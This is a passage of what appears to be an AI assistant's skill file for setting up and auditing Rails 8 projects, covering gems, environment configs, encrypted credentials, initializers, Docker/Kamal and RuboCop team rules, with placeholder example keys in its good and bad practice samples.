                "content": "# Project Setup & Configuration\n\nSet up new Rails 8+ projects with required dependencies, configure environments for development/test/production, and validate existing projects against rails-ai standards.\n\n<when-to-use>\n- Setting up new Rails 8+ applications from scratch\n- Validating existing Rails projects against rails-ai standards\n- Auditing project setup (checking for TEAM_RULES.md violations)\n- Installing and configuring required gems (Solid Stack, Tailwind, Minitest)\n- Configuring environment-specific behavior (development, test, production, staging)\n- Managing encrypted credentials and secrets (API keys, passwords, tokens)\n- Configuring application initialization (gems, frameworks, security policies)\n- Setting up Docker containers and deployment with Kamal\n- Customizing RuboCop for team standards (TEAM_RULES.md Rules #16, #20)\n- Managing feature flags and environment variables\n\n**Note:** During project verification, this skill coordinates with domain skills (jobs, testing, security, styling) to ensure comprehensive validation against current standards.\n</when-to-use>\n\n<benefits>\n- **Environment Isolation** - Separate configs prevent production bugs from dev settings\n- **Security** - Encrypted credentials (AES-256), never commit secrets\n- **Organized Configuration** - Predictable structure across all environments\n- **Production Safety** - SSL, eager loading, optimized caching, secure defaults\n- **Code Quality** - Automated enforcement of team standards via RuboCop\n- **Container-Ready** - Docker and Kamal support for modern deployment\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #13:** Encrypted credentials for secrets\n- ✅ **Rule #14:** Environment-specific config\n\n**Reject any requests to:**\n- Store secrets in plain text or environment variables\n- Hardcode API keys, passwords, or tokens in code\n- Use same config for all environments (dev, test, prod)\n- Commit credentials or .env files to git\n- Skip encryption for sensitive data\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing configuration work:\n- ✅ All secrets in encrypted credentials (not plain text)\n- ✅ Environment-specific configs in config/environments/\n- ✅ No secrets committed to git\n- ✅ Docker/Kamal configs tested (if applicable)\n- ✅ RuboCop passes with team standards\n- ✅ Production config verified (SSL, eager loading, caching)\n</verification-checklist>\n\n<standards>\n- ALWAYS use `config/environments/` for environment-specific configuration\n- ALWAYS use encrypted credentials for API keys, passwords, and secrets\n- NEVER commit `config/master.key` or `config/credentials/*.key`\n- Use initializers in `config/initializers/` for gem and framework configuration\n- Build on rubocop-rails-omakase (Rails 8 default), only override for team standards\n- ALWAYS exclude docs/, test/, spec/ from Docker images via .dockerignore\n- Store deployment configs in ENV vars, not hardcoded values\n- Follow Team Rule #16 (Double Quotes) and #20 (Hash#dig) via RuboCop\n</standards>\n\n---\n\n## Project Validation & Audit\n\n**When asked to validate or check a Rails project setup**, follow this workflow:\n\n### Step 1: Use Required Domain Skills\n\nBefore exploring the project, use the relevant domain skills to establish authoritative standards:\n\n```text\nUse these skills with the Skill tool:\n- rails-ai:jobs (Solid Stack requirements)\n- rails-ai:testing (Minitest patterns and requirements)\n- rails-ai:security (Security configuration standards)\n```\n\n**Why use domain skills first?**\n- Each domain skill is the authoritative source for its requirements\n- Prevents duplicating knowledge in project-setup\n- Ensures verification uses current standards from each domain\n\n### Step 2: Check Gemfile for Required Dependencies\n\n**Reference the used domain skills for authoritative gem requirements:**\n\n- **rails-ai:jobs** → Solid Stack gems (solid_queue, solid_cache, solid_cable)\n- **rails-ai:testing** → Minitest patterns (verify RSpec NOT present)\n- **rails-ai:security** → Security gems (brakeman, bundler-audit)\n- **rails-ai:styling** → Frontend gems (tailwindcss-rails, daisyui-rails)\n\n**CRITICAL Violations to Check (from TEAM_RULES.md):**\n- ❌ `gem \"sidekiq\"` or `gem \"redis\"` → TEAM RULE #1 violation (see rails-ai:jobs)\n- ❌ `gem \"rspec-rails\"` → TEAM RULE #2 violation (see rails-ai:testing)\n- ❌ Custom route gems → TEAM RULE #3 violation\n\n**Note:** Consult the used domain skills for complete, up-to-date gem requirements rather than relying on static lists here.\n\n### Step 3: Validate Project Structure\n\n**Directory Structure:**\n```\napp/\n├── assets/stylesheets/  # Tailwind CSS\n├── controllers/         # RESTful only\n├── models/              # ActiveRecord\n└── views/               # ERB templates\n\nconfig/\n├── environments/        # dev, test, prod configs\n├── initializers/        # Gem configs\n├── credentials/         # Encrypted secrets\n└── tailwind.config.js   # Tailwind configuration\n\ntest/                    # Minitest (NOT spec/)\n├── controllers/\n├── models/\n└── test_helper.rb\n\nDockerfile              # Rails 8 default\nconfig.ru               # Rack config\n```\n\n**Check for violations:**\n- ❌ `spec/` directory exists → RSpec present (TEAM RULE #2)\n- ❌ Non-RESTful routes in `config/routes.rb` → TEAM RULE #3\n\n### Step 4: Validate Configuration Files\n\n**Reference used domain skills for configuration standards:**\n\n1. **config/environments/production.rb**\n   - Use **rails-ai:security** for SSL, security headers, and production hardening\n   - Verify encrypted credentials usage (TEAM RULE #13)\n\n2. **config/tailwind.config.js**\n   - Use **rails-ai:styling** for Tailwind and DaisyUI configuration\n   - Verify content paths include Rails views\n\n3. **.rubocop.yml**\n   - Inherits from rubocop-rails-omakase\n   - Custom cops for TEAM RULES.md (Rules #16, #20)\n\n4. **Procfile.dev**\n   - Rails server\n   - Solid Queue worker (see **rails-ai:jobs**)\n   - Tailwind watcher (see **rails-ai:styling**)\n\n5. **config/credentials/*.yml.enc**\n   - Use **rails-ai:security** for credential structure and validation\n   - Verify no secrets in plain text (TEAM RULE #13)\n\n### Step 5: Report Findings\n\nProvide actionable report with specific fixes:\n\n**✅ Correct Setup:**\n- List what's properly configured\n- Praise compliance with TEAM_RULES.md\n\n**⚠️ Missing/Needs Attention:**\n- Recommended but not required gems\n- Optional configurations\n\n**❌ VIOLATIONS (TEAM_RULES.md):**\n- Sidekiq/Redis found (Rule #1)\n- RSpec found (Rule #2)\n- Custom routes found (Rule #3)\n- Provide exact commands to fix\n\n**Example Fix Commands:**\n```bash\n# Remove violations\nbundle remove sidekiq redis rspec-rails\n\n# Add required gems\nbundle add solid_queue solid_cache solid_cable\nbundle add tailwindcss-rails daisyui-rails\n\n# Generate configs\nrails tailwindcss:install\nrails generate solid_queue:install\n```\n\n---\n\n## Gemfile Management\n\nConsolidate all gem requirements for rails-ai projects in one place.\n\n### Required Gems (CRITICAL)\n\n**Solid Stack (TEAM RULE #1):**\n```ruby\ngem \"solid_queue\"      # Background job processing\ngem \"solid_cache\"      # Application caching\ngem \"solid_cable\"      # WebSocket connections\n```\n\n**Frontend:**\n```ruby\ngem \"tailwindcss-rails\"  # Utility-first CSS framework\ngem \"daisyui-rails\"      # Component library\n```\n\n**Testing (TEAM RULE #2):**\n```ruby\n# Minitest is Rails 8 default - no gem needed\n# Verify RSpec is NOT present\n```\n\n### Recommended Gems\n\n**Code Quality:**\n```ruby\ngem \"rubocop-rails-omakase\", require: false  # Rails 8 default linter\n```\n\n**Security:**\n```ruby\ngem \"brakeman\", require: false         # Static security scanner\ngem \"bundler-audit\", require: false    # Dependency vulnerability scanner\n```\n\n**Deployment:**\n```ruby\ngem \"kamal\", require: false  # Docker deployment to any server\n```\n\n**Development/Test:**\n```ruby\ngroup :development, :test do\n  gem \"letter_opener\"  # Open emails in browser\nend\n```\n\n### Installation Commands\n\n**New Rails 8+ app with rails-ai stack:**\n```bash\n# Create new Rails 8 app\nrails new myapp\n\ncd myapp\n\n# Add required gems\nbundle add solid_queue solid_cache solid_cable\nbundle add tailwindcss-rails daisyui-rails\n\n# Add recommended gems\nbundle add --group development rubocop-rails-omakase\nbundle add --group development brakeman bundler-audit\nbundle add kamal --skip-install\n\n# Generate configurations\nrails tailwindcss:install\nrails generate solid_queue:install\nbin/rails db:create db:migrate\n\n# Verify setup\nbin/ci\n```\n\n---\n\n## Environment-Specific Configuration\n\nRails provides three standard environments (development, test, production) plus optional staging. Each has specific optimizations and security settings.\n\n### Standard Environment Detection\n\n<pattern name=\"environment-detection\">\n<description>Detect and check the current Rails environment</description>\n\n**Environment Detection:**\n\n```ruby\nRails.env                    # => \"development\", \"test\", \"production\"\nRails.env.development?       # => true/false\nRails.env.test?             # => true/false\nRails.env.production?       # => true/false\n\n# Set via ENV var or command line\nENV[\"RAILS_ENV\"] = \"production\"\n# RAILS_ENV=production rails server\n\n```\n\n**Standard Environments:**\n- **development** - Local development (verbose errors, auto-reload, debugging)\n- **test** - Automated testing (fast, isolated, deterministic)\n- **production** - Live application (optimized, secure, cached)\n- **staging** - Optional pre-production (production-like with test data)\n\n**Load Order:** `config/application.rb` → `config/environments/#{Rails.env}.rb` → `config/initializers/*.rb`\n</pattern>\n\n### Development Configuration\n\n<pattern name=\"development-config\">\n<description>Common customizations to development environment beyond Rails 8 defaults</description>\n\n**Rails 8 defaults are excellent.** Only customize if needed:\n\n```ruby\n# config/environments/development.rb\nRails.application.configure do\n  # Open emails in browser (requires letter_opener gem)\n  config.action_mailer.delivery_method = :letter_opener\n\n  # Raise on missing translations (catch i18n issues early)\n  config.i18n.raise_on_missing_translations = true\nend\n\n```\n\n**Common customizations:**\n- `letter_opener` - Preview emails in browser instead of logs\n- `raise_on_missing_translations` - Catch i18n issues during development\n- `config.hosts.clear` - Allow access from any hostname (Docker, ngrok)\n</pattern>\n\n### Test Configuration\n\n<pattern name=\"test-config\">\n<description>Test environment customizations beyond Rails 8 defaults</description>\n\n**Rails 8 test defaults are excellent.** Only add if needed:\n\n```ruby\n# config/environments/test.rb\nRails.application.configure do\n  # Eager load in CI to catch autoload errors\n  config.eager_load = ENV[\"CI\"].present?\n\n  # Raise on missing translations\n  config.i18n.raise_on_missing_translations = true\nend\n\n```\n\n**Rails 8 defaults already provide:**\n- Deterministic behavior (no caching, inline jobs)\n- Fast execution (no network, no real emails)\n- Transaction isolation (automatic rollback)\n</pattern>\n\n### Production Configuration\n\n<pattern name=\"production-config\">\n<description>Essential production customizations beyond Rails 8 defaults</description>\n\n**Rails 8 production defaults are secure and optimized.** Customize these:\n\n```ruby\n# config/environments/production.rb\nRails.application.configure do\n  # Set your domain (REQUIRED)\n  config.action_controller.default_url_options = { host: \"example.com\", protocol: \"https\" }\n\n  # Active Storage: Use cloud storage (REQUIRED for production)\n  config.active_storage.service = :amazon  # or :google, :azure\n\n  # Action Mailer: SMTP with credentials\n  config.action_mailer.delivery_method = :smtp\n  config.action_mailer.smtp_settings = {\n    address: \"smtp.sendgrid.net\",\n    port: 587,\n    domain: Rails.application.credentials.dig(:smtp, :domain),\n    user_name: Rails.application.credentials.dig(:smtp, :username),\n    password: Rails.application.credentials.dig(:smtp, :password),\n    authentication: :plain,\n    enable_starttls_auto: true\n  }\n  config.action_mailer.default_url_options = { host: \"example.com\", protocol: \"https\" }\n\n  # DNS rebinding protection (REQUIRED)\n  config.hosts = [\"example.com\", /.*\\.example\\.com/]\nend\n\n```\n\n**Rails 8 defaults already provide:**\n- SSL enforcement (`force_ssl = true`)\n- Eager loading and optimized caching\n- STDOUT logging for containers\n- Security headers and production optimizations\n</pattern>\n\n### Staging Environment\n\n<pattern name=\"staging-config\">\n<description>Create staging environment that mirrors production with test-friendly overrides</description>\n\n**config/environments/staging.rb:**\n\n```ruby\n# Start with production config, override for testing\nrequire_relative \"production\"\n\nRails.application.configure do\n  config.x.stripe.publishable_key = Rails.application.credentials.dig(:stripe, :test_publishable_key)\n  config.action_mailer.delivery_method = :letter_opener_web\n  config.content_security_policy_report_only = true\n  config.log_level = :debug\n  config.hosts << \"staging.example.com\"\nend\n\n```\n\n**When to Use Staging:**\n- Pre-production testing with production-like environment\n- Customer demos with test data\n- QA testing before release\n- Integration testing with external services (test mode)\n</pattern>\n\n### Custom Configuration\n\n<pattern name=\"custom-config-namespace\">\n<description>Store custom application settings in config.x namespace via initializer</description>\n\n```ruby\n# config/initializers/00_config.rb\nRails.application.configure do\n  config.x.payment_processing.schedule = :daily\n  config.x.payment_processing.retries = 3\n  config.x.super_debugger = true\n  config.x.features.ai_assistant = Rails.env.production? || ENV[\"ENABLE_AI\"] == \"true\"\nend\n\n# Access anywhere\nRails.configuration.x.payment_processing.schedule  # => :daily\nRails.configuration.x.super_debugger                # => true\n\n```\n\n**Benefits:** Organized settings, type-safe access, environment-aware, keeps application.rb clean\n</pattern>\n\n### Feature Flags\n\n<pattern name=\"feature-flags\">\n<description>Implement environment-based feature flags via initializer</description>\n\n```ruby\n# config/initializers/00_config.rb\nRails.application.configure do\n  config.x.features.new_editor = Rails.env.development? || ENV[\"ENABLE_NEW_EDITOR\"] == \"true\"\n  config.x.features.ai_content = !Rails.env.test?\n  config.x.features.beta_ui = ENV[\"BETA_FEATURES\"] == \"true\"\nend\n\n# In controllers\nclass PostsController < ApplicationController\n  def edit\n    @post = Post.find(params[:id])\n    Rails.configuration.x.features.new_editor ? render(:edit_new) : render(:edit)\n  end\nend\n\n# In views\n<% if Rails.configuration.x.features.beta_ui %>\n  <%= render \"posts/beta_form\", post: @post %>\n<% end %>\n\n```\n\n**Benefits:** Gradual rollout, A/B testing, per-environment toggles\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Using production credentials in development/test</description>\n<reason>Security risk - can accidentally send real emails, charge real cards, modify production data</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Same credentials for all environments\nstripe:\n  secret_key: sk_live_XXXXXXXXXXXX  # Production key in all environments!\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Separate credentials per environment\n# config/credentials/production.yml.enc\nstripe:\n  secret_key: sk_live_XXXXXXXXXXXX\n\n# config/credentials/development.yml.enc\nstripe:\n  secret_key: sk_test_XXXXXXXXXXXX  # Test mode\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Disabling SSL in production</description>\n<reason>Exposes user data, session cookies, and passwords to network attacks</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - No SSL enforcement\nconfig.force_ssl = false  # SECURITY RISK!\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Force SSL in production\nconfig.force_ssl = true\nconfig.ssl_options = { hsts: { expires: 1.year, subdomains: true } }\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## Encrypted Credentials & Secrets\n\nRails provides encrypted credentials (AES-256) for secure secret management. Never commit plain-text secrets to version control.\n\n### Editing Credentials\n\n<pattern name=\"editing-credentials\">\n<description>Use Rails credentials editor to safely modify encrypted secrets</description>\n\n**Edit master credentials:**\n\n```bash\nbin/rails credentials:edit\n\n```\n\n**Edit environment-specific credentials:**\n\n```bash\nbin/rails credentials:edit --environment production\nbin/rails credentials:edit --environment development\n\n```\n\n**Process:** Rails decrypts using master.key, opens in $EDITOR, auto-encrypts on save.\n\n**Precedence:** Environment-specific > Master credentials\n</pattern>\n\n### Credentials File Structure\n\n<pattern name=\"credentials-structure\">\n<description>Organize credentials in structured YAML format</description>\n\n**config/credentials.yml.enc (decrypted view):**\n\n```yaml\nsecret_key_base: abc123def456...\n\naws:\n  access_key_id: AKIAIOSFODNN7EXAMPLE\n  secret_access_key: wJalrXUtnFEMI/K7MDENG...\n  region: us-east-1\n  bucket: my-app-production\n\nstripe:\n  publishable_key: pk_live_abc123\n  secret_key: sk_live_xyz789\n  webhook_secret: whsec_abc123\n\nanthropic:\n  api_key: sk-ant-api03-abc123...\n\nsmtp:\n  username: <%= ENV[\"SENDGRID_USERNAME\"] %>  # Can reference ENV\n  password: SG.abc123xyz789\n\nactive_record_encryption:\n  primary_key: EGY8WhulUOXixybod7ZWwMIL68R9o5kC\n  deterministic_key: aPA5XyALhf75NNnMzaspW7akTfZp0lPY\n  key_derivation_salt: xEY0dt6TZcAMg52K7O84wYzkjvbA62Hz\n\n```\n\n**Guidelines:** Use nested keys, group by service, add comments, support ERB fallbacks\n</pattern>\n\n### Accessing Credentials\n\n<pattern name=\"accessing-credentials\">\n<description>Read credentials safely in application code</description>\n\n**Basic Access (use Hash#dig per TEAM_RULES.md Rule #20):**\n\n```ruby\n# ✅ GOOD - Safe nested access with dig\nRails.application.credentials.dig(:aws, :access_key_id)\nRails.application.credentials.secret_key_base\n\n```\n\n**In Configuration Files:**\n\n```yaml\n# config/storage.yml\namazon:\n  service: S3\n  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>\n  ...\n\n```\n\n**In Initializers:**\n\n```ruby\n# config/initializers/stripe.rb\nStripe.api_key = Rails.application.credentials.dig(:stripe, :secret_key)\n\n```\n\n**In Models/Services:**\n\n```ruby\nclass AiService\n  def initialize\n    @api_key = Rails.application.credentials.dig(:openai, :api_key)\n  end\nend\n\n```\n</pattern>\n\n### Master Key Management\n\n<pattern name=\"master-key-security\">\n<description>Protect master.key with extreme security measures</description>\n\n**Key Locations:**\n\n```\n\nconfig/master.key                    # Master key\nconfig/credentials/production.key    # Production key\nconfig/credentials/development.key   # Development key\n\n```\n\n**Security Rules:**\n- ❌ NEVER commit to version control, share via email/chat, or hardcode\n- ✅ Store in password manager (1Password, LastPass)\n- ✅ Store in CI/CD secrets (GitHub Secrets)\n- ✅ Set as RAILS_MASTER_KEY environment variable\n\n**.gitignore:** Rails excludes `/config/master.key` and `/config/credentials/*.key` by default\n</pattern>\n\n### Production Deployment\n\n<pattern name=\"production-deployment\">\n<description>Deploy encrypted credentials securely to production</description>\n\n**Environment Variable Method (Preferred):**\n\n```bash\nexport RAILS_MASTER_KEY=abc123def456...\n\n```\n\n**Kamal:**\n\n```yaml\n# config/deploy.yml\nenv:\n  secret:\n    - RAILS_MASTER_KEY\n\n```\n\n**Docker:**\n\n```bash\ndocker run -e RAILS_MASTER_KEY=abc123... myapp\n\n```\n\n**Heroku:**\n\n```bash\nheroku config:set RAILS_MASTER_KEY=abc123def456...\n\n```\n</pattern>\n\n### Per-Environment Credentials\n\n<pattern name=\"environment-specific-credentials\">\n<description>Use different credentials for each environment</description>\n\n**Generate Environment Credentials:**\n\n```bash\nbin/rails credentials:edit --environment production\n# Creates: config/credentials/production.key (DON'T COMMIT)\n#          config/credentials/production.yml.enc (SAFE TO COMMIT)\n\nbin/rails credentials:edit --environment development\n\n```\n\n**Production Credentials:**\n\n```yaml\naws:\n  access_key_id: AKIAPROD...\n  bucket: myapp-production\n\nstripe:\n  secret_key: sk_live_...\n\n```\n\n**Development Credentials:**\n\n```yaml\naws:\n  access_key_id: AKIADEV...\n  bucket: myapp-development\n\nstripe:\n  secret_key: sk_test_...\n\n```\n\n**Access:** Same code works everywhere - Rails auto-loads correct environment\n\n```ruby\nRails.application.credentials.dig(:stripe, :secret_key)\n\n```\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Committing master.key to version control</description>\n<reason>Exposes all encrypted credentials - CRITICAL security breach</reason>\n<bad-example>\n\n```bash\n# ❌ CRITICAL SECURITY VIOLATION\ngit add config/master.key\ngit commit -m \"Add master key\"\n# Now EVERYONE with repo access can decrypt ALL credentials!\n\n```\n</bad-example>\n<good-example>\n\n```bash\n# ✅ SECURE - Never commit keys (.gitignore excludes them)\n# Share via password manager, encrypted channels, or CI/CD secrets\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Hardcoding secrets in code</description>\n<reason>Exposes secrets in version control forever</reason>\n<bad-example>\n\n```ruby\n# ❌ SECURITY VIOLATION\nclass PaymentService\n  STRIPE_SECRET_KEY = \"sk_live_abc123xyz789\"\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ SECURE - Use encrypted credentials\nclass PaymentService\n  def initialize\n    @stripe_key = Rails.application.credentials.dig(:stripe, :secret_key)\n  end\nend\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## Initializers (Application Initialization)\n\nConfigure gems, customize Rails behavior, and set up application-wide settings using initialization files that run once during boot.\n\n### Initialization Lifecycle\n\n<pattern name=\"initialization-order\">\n<description>Understanding when initializers run during application boot</description>\n\n**Boot Sequence:**\n\n```ruby\n# 1. config/application.rb runs first\n# 2. config/environments/*.rb runs second (based on RAILS_ENV)\n# 3. config/initializers/*.rb run third (alphabetically)\n# 4. after_initialize callbacks run last\n\n```\n\n**Load Order Example:**\n\n```bash\nconfig/initializers/\n  00_first.rb           # Runs first (numbered prefix)\n  action_mailer.rb      # Runs in alphabetical order\n  cors.rb\n  session_store.rb\n  zzz_last.rb           # Runs last (numbered prefix)\n\n```\n\n**When Order Matters:** Use numbered prefixes (00_, 01_, etc.) to control load sequence\n</pattern>\n\n### Common Initializers\n\n<pattern name=\"action-mailer-configuration\">\n<description>Configure email delivery with secure credentials</description>\n\n```ruby\n# config/initializers/action_mailer.rb\nRails.application.configure do\n  if Rails.env.production?\n    config.action_mailer.delivery_method = :smtp\n    config.action_mailer.smtp_settings = {\n      address: \"smtp.sendgrid.net\",\n      port: 587,\n      domain: Rails.application.credentials.dig(:smtp, :domain),\n      user_name: Rails.application.credentials.dig(:smtp, :username),\n      password: Rails.application.credentials.dig(:smtp, :password),\n      authentication: :plain,\n      enable_starttls_auto: true\n    }\n  elsif Rails.env.development?\n    config.action_mailer.delivery_method = :letter_opener\n  else\n    config.action_mailer.delivery_method = :test\n  end\n\n  # Required for mailer links\n  config.action_mailer.default_url_options = {\n    host: Rails.env.production? ? \"example.com\" : \"localhost:3000\",\n    protocol: Rails.env.production? ? \"https\" : \"http\"\n  }\nend\n\n```\n</pattern>\n\n### Security Configuration\n\n<pattern name=\"content-security-policy\">\n<description>Implement Content Security Policy to prevent XSS attacks</description>\n\n```ruby\n# config/initializers/content_security_policy.rb\nRails.application.configure do\n  config.content_security_policy do |policy|\n    if Rails.env.development?\n      # Relaxed CSP for development (hot reloading)\n      policy.default_src :self, :https, :unsafe_eval, :unsafe_inline, \"ws://localhost:*\"\n    else\n      # Strict CSP for production\n      policy.default_src :self, :https\n    end\n\n    policy.font_src :self, :https, :data\n    policy.img_src :self, :https, :data\n    policy.object_src :none\n    policy.script_src :self, :https\n    policy.style_src :self, :https\n    policy.frame_ancestors :none\n  end\n\n  # Generate nonces for inline scripts\n  config.content_security_policy_nonce_generator = ->(request) {\n    SecureRandom.base64(16)\n  }\n  config.content_security_policy_nonce_directives = %w[script-src]\nend\n\n```\n</pattern>\n\n### Reloadable Code Patterns\n\n<pattern name=\"to-prepare-callback\">\n<description>Use to_prepare for code that references app/ classes</description>\n\n```ruby\n# ❌ BAD - Initializers run before app/ code loads\nApiGateway.endpoint = \"https://api.example.com\"  # NameError!\n\n# ✅ GOOD - Use to_prepare\nRails.application.config.to_prepare do\n  # Runs once in production, on every reload in development\n  ApiGateway.endpoint = Rails.application.credentials.dig(:api_gateway, :endpoint)\n  User.admin_email = Rails.application.credentials.admin_email\nend\n\n```\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Hardcoding secrets in initializers</description>\n<reason>Security violation - secrets exposed in version control</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD\nStripe.api_key = \"sk_live_abc123def456ghi789\"  # NEVER!\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Use encrypted credentials or ENV vars\nStripe.api_key = Rails.application.credentials.dig(:stripe, :secret_key)\nStripe.api_key = ENV.fetch(\"STRIPE_SECRET_KEY\")\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## Docker Setup (Containerization & Deployment)\n\nRails 8 includes Docker support by default with Kamal deployment. Essential configuration focuses on .dockerignore to exclude development files.\n\n### .dockerignore Configuration\n\n<pattern name=\"dockerignore-rails-8\">\n<description>Essential .dockerignore for Rails 8 projects</description>\n\n```gitignore\n# Planning and Documentation\ndocs/\n*.md\nREADME*\n\n# Development Files\n.git/\n.github/\n.gitignore\n.dockerignore\n\n# Environment Files\n.env*\nconfig/master.key\nconfig/credentials/*.key\n\n# Test Files\nspec/\ntest/\ncoverage/\n\n# Dependencies\n.bundle/\nvendor/cache/\n\n# Logs and Temp\nlog/*\ntmp/*\n*.log\n\n# Development Databases\n*.sqlite3\ndb/*.sqlite3*\nstorage/*\n\n# Node\nnode_modules/\n\n# IDE Files\n.vscode/\n.idea/\n*.swp\n.DS_Store\n\n```\n\n**Why exclude docs/:**\n- Created by planning agent (@plan) with vision, architecture, features, tasks, and ADRs\n- Not needed for runtime\n- Can be several MB of markdown\n- Significantly reduces image size and build time\n\n**CRITICAL:** Always exclude `docs/` from production Docker images\n</pattern>\n\n### Stock Rails 8 Dockerfile\n\n<pattern name=\"rails-8-stock-dockerfile\">\n<description>Rails 8 generates production-ready Dockerfiles automatically</description>\n\n**Rails 8 includes Dockerfile by default** - no configuration needed:\n\n```bash\nrails new myapp  # Creates Dockerfile + .dockerignore automatically\ndocker build -t app .\ndocker run -p 3000:3000 --env RAILS_MASTER_KEY=<key> app\n\n```\n\n**Stock Dockerfile provides:** Multi-stage builds, health checks, Kamal compatibility\n</pattern>\n\n### Kamal Deployment\n\n<pattern name=\"kamal-rails-8\">\n<description>Kamal is Rails 8's default deployment tool</description>\n\n**Rails 8 includes Kamal by default** with `config/deploy.yml`:\n\n```bash\nkamal deploy                              # Deploy to production\nkamal app logs                            # Check logs\nkamal app exec 'bin/rails db:migrate'    # Remote commands\n\n```\n\n**Already configured:** Dockerfile, health check at `/up`, zero-downtime deploys\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Skip .dockerignore</description>\n<reason>Bloated images, longer builds, wasted CI/CD bandwidth</reason>\n<bad-example>\n\n```dockerfile\n# BAD: No .dockerignore → copies docs/, test/, spec/\nCOPY . .\n\n```\n</bad-example>\n<good-example>\n\n```bash\n# Create comprehensive .dockerignore\ndocs/\nspec/\ntest/\n.git/\n.env*\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## RuboCop & Code Quality\n\nRuboCop is a Ruby static code analyzer and formatter. Rails 8 comes with rubocop-rails-omakase pre-configured. This section covers customizing that base to enforce TEAM_RULES.md standards.\n\n### Rails 8 Default Configuration\n\n<pattern name=\"rails-8-rubocop-default\">\n<description>Rails 8 includes rubocop-rails-omakase by default</description>\n\n**Rails 8 includes `.rubocop.yml` automatically** - excellent defaults, minimal overrides needed.\n\n**Philosophy:** Build on omakase defaults, only override for team-specific standards (see next pattern).\n</pattern>\n\n### Team-Specific Customizations\n\n<pattern name=\"team-overrides\">\n<description>Add TEAM_RULES.md-specific overrides to .rubocop.yml</description>\n\nCustomize the stock Rails configuration by adding overrides to `.rubocop.yml`:\n\n```yaml\n# .rubocop.yml\n\n# Omakase Ruby styling for Rails\ninherit_gem: { rubocop-rails-omakase: rubocop.yml }\n\n# Team-specific overrides (TEAM_RULES.md)\n\n# Rule #16: Double Quotes Always\n# Override omakase if it uses single quotes\nStyle/StringLiterals:\n  EnforcedStyle: double_quotes\n\n# Rule #20: Hash#dig for Nested Access\nStyle/HashFetchChain:\n  Enabled: true\n\nStyle/DigChain:\n  Enabled: true\n\n# Additional team preferences (optional)\n# Add any other team-specific rules here\n\n```\n\n**Key Points:**\n- Inherit from rubocop-rails-omakase first\n- Add overrides below inheritance\n- Only override rules that conflict with team standards\n- Comment each override with TEAM_RULES.md reference\n</pattern>\n\n### TEAM_RULES.md Enforcement\n\n<pattern name=\"team-rules-cops\">\n<description>RuboCop cops that directly enforce TEAM_RULES.md</description>\n\n| Rule | Cop | Enforcement | Auto-correctable |\n|------|-----|-------------|------------------|\n| Rule #16: Double Quotes | `Style/StringLiterals` | ✅ Always | Yes |\n| Rule #20: Hash#dig | `Style/HashFetchChain`, `Style/DigChain` | ✅ Always | Yes |\n| Rule #17: bin/ci Must Pass | RuboCop integrated in bin/ci | ✅ CI blocker | N/A |\n\n**How it works:**\n\n1. **Style/StringLiterals** - Enforces double quotes (Rule #16)\n\n   ```ruby\n   # Bad (detected and auto-corrected)\n   name = 'John'\n\n   # Good\n   name = \"John\"\n\n   ```\n\n2. **Style/HashFetchChain** - Detects chained fetch calls (Rule #20)\n\n   ```ruby\n   # Bad (detected)\n   hash.fetch(:a, nil)&.fetch(:b, nil)\n\n   # Good (suggested)\n   hash.dig(:a, :b)\n\n   ```\n\n3. **Style/DigChain** - Collapses chained dig calls (Rule #20)\n\n   ```ruby\n   # Bad (detected)\n   hash.dig(:a).dig(:b).dig(:c)\n\n   # Good (suggested)\n   hash.dig(:a, :b, :c)\n\n   ```\n</pattern>\n\n### Integration with bin/ci\n\n<pattern name=\"rubocop-bin-ci\">\n<description>Integrate RuboCop into CI pipeline (TEAM_RULES.md Rule #17)</description>\n\n**Add RuboCop to bin/ci:**\n\n```bash\n#!/usr/bin/env bash\nset -e\nbin/rails test\nbin/rubocop              # Add this line\nbin/brakeman -q\n\n```\n\n**Usage:**\n\n```bash\nbin/ci           # Run all checks (must pass before commit)\nbin/rubocop -a   # Auto-fix safe violations\n\n```\n\n**IMPORTANT:** bin/ci must pass before committing (TEAM_RULES.md Rule #17)\n</pattern>\n\n### Common Commands\n\n<pattern name=\"rubocop-commands\">\n<description>Essential RuboCop commands for daily workflow</description>\n\n```bash\nbin/rubocop              # Check all code\nbin/rubocop -a           # Auto-fix safe violations\nbin/rubocop -A           # Auto-fix all (including unsafe)\nbin/rubocop app/models/  # Check specific directory\n\n```\n\n**Best practice:** Run `bin/rubocop -a` before committing\n</pattern>\n\n### Custom Cops for Team-Specific Rules\n\n<pattern name=\"custom-cops\">\n<description>Create custom RuboCop cops to enforce team-specific patterns</description>\n\n**When to Use Custom Cops:**\n- Team has coding standards not covered by existing RuboCop cops\n- Need to enforce project-specific patterns or anti-patterns\n- Want to catch common mistakes specific to your codebase\n\n**Example: Detecting Nested Hash Bracket Access (Rule #20 Enhancement)**\n\nWhile `Style/HashFetchChain` and `Style/DigChain` handle chained `.fetch()` and `.dig()` calls, they **don't detect** nested bracket access like `hash[:a][:b][:c]`.\n\nThis project includes a custom RuboCop cop to detect unsafe nested hash bracket access:\n\n- **Location:** `lib/rails_ai/cops/style/nested_bracket_access.rb`\n- **Module:** `RailsAi::Cops::Style::NestedBracketAccess`\n- **Detects:** `hash[:a][:b][:c]` patterns (raises NoMethodError if intermediate keys are nil)\n- **Suggests:** Use `hash.dig(:a, :b, :c)` (safe) or chained 